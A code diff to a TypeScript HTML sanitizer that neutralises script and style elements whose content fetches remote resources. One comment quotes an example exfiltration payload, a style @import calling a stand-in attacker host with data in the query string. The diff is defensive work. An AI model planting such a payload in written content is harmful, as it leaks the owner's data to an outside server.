@@ -18,6 +18,7 @@
 
 import type { ParsedTag } from './html.js';
 import {
+  elementEnd,
   findRemoteUrl,
   isRemoteUrl,
   nextTag,
@@ -130,6 +131,49 @@ interface PassResult {
   count: number;
 }
 
+/** Elements whose CONTENT — not an attribute — can fetch a remote resource. */
+const SCRIPT_STYLE_TAGS: ReadonlySet<string> = new Set(['script', 'style']);
+
+/**
+ * Neutralize `<script>`/`<style>` elements whose content references a remote
+ * URL. The payload lives between the tags, so the attribute scan above cannot
+ * see it: a written `<style>@import url(https://attacker/?d=…)` is fetched by
+ * the owner's client exactly like a remote `<img>`, which would reopen the
+ * exfiltration channel the write sanitizer exists to close. Elements that
+ * reference only local resources are left untouched.
+ */
+function replaceRemoteScriptStyle(input: string): PassResult {
+  let out = '';
+  let cursor = 0;
+  let pos = 0;
+  let count = 0;
+  for (;;) {
+    const tag = nextTag(input, pos);
+    if (!tag) break;
+    if (!SCRIPT_STYLE_TAGS.has(tag.name)) {
+      pos = tag.start + 1;
+      continue;
+    }
+    const end = elementEnd(input, tag);
+    const element = input.slice(tag.start, end);
+    const content = input.slice(tag.end, end);
+    const url =
+      (tag.name === 'style' ? remoteUrlInStyle(content) : undefined) ??
+      findRemoteUrl(element);
+    if (url === undefined) {
+      pos = tag.end;
+      continue;
+    }
+    out += input.slice(cursor, tag.start);
+    out += `[external content removed: ${displayUrl(url)}]`;
+    count += 1;
+    cursor = end;
+    pos = end;
+  }
+  out += input.slice(cursor);
+  return { content: out, count };
+}
+
 /** Replace every tag that would make the client fetch something remote. */
 function replaceFetchVectors(input: string): PassResult {
   let out = '';
@@ -194,6 +238,12 @@ function writePass(input: string): { content: string; counts: WriteCounts } {
   counts.obsidianComments = obsidian.count;
   let content = obsidian.content;
 
+  // 0. `<script>`/`<style>` elements fetch from their content, not an
+  //    attribute. Neutralize remote ones first so a splice they leave is
+  //    caught by the image and tag scans below in the same pass.
+  const scriptStyle = replaceRemoteScriptStyle(content);
+  content = scriptStyle.content;
+
   // 1. Inline images: de-embed remote, strip data:, leave local untouched.
   content = content.replace(
     INLINE_IMAGE_RE,
@@ -234,7 +284,7 @@ function writePass(input: string): { content: string; counts: WriteCounts } {
   //    is replaced (spec: "replace tag"); a container's inner fallback text
   //    stays visible, which is harmless once the fetching tag is gone.
   const vectors = replaceFetchVectors(content);
-  counts.htmlVectors = vectors.count;
+  counts.htmlVectors = vectors.count + scriptStyle.count;
 
   return { content: vectors.content, counts };
 }
